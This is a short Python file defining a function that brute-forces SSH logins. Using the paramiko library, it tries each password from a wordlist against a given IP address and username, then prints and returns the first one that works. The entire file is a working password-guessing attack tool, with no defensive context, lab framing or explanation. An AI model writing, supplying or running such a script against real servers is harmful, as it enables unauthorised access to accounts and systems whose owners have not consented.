import paramiko

def brute_force_ssh(ip, username, wordlist_path):
    print(f"[+] Starting SSH brute-force on {ip} for user {username}")
    with open(wordlist_path, 'r') as wordlist:
        for password in wordlist:
            password = password.strip()
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(ip, username=username, password=password, timeout=3)
                print(f"[+] SUCCESS: {username}@{ip} with password: {password}")
                return password
            except paramiko.AuthenticationException:
                print(f"[-] Failed: {password}")
            except Exception as e:
                print(f"[!] Error: {e}")
    print("[-] Brute force failed. No valid password found.")

